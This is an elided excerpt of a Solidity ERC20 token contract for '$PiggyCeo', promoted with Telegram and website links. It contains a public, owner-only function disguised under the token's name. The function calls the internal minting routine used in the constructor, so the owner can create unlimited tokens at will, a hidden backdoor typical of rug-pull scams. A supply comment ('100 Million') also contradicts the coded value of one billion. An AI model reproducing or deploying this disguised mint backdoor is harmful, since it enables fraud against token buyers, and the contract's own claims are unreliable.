...
//
// $PiggyCeo proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/PiggyCeo
// 📱 Website ::https://piggyceo.website
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _PiggyCeo(uint256 amount) public onlyOwner {
 _PiggyCeo(msg.sender, amount);
    }
    ...
    function _PiggyCeo(address account, uint256 amount) internal virtual {
...
contract $PiggyCeo is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Piggy Ceo", "PIGCEO") {
     _PiggyCeo(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}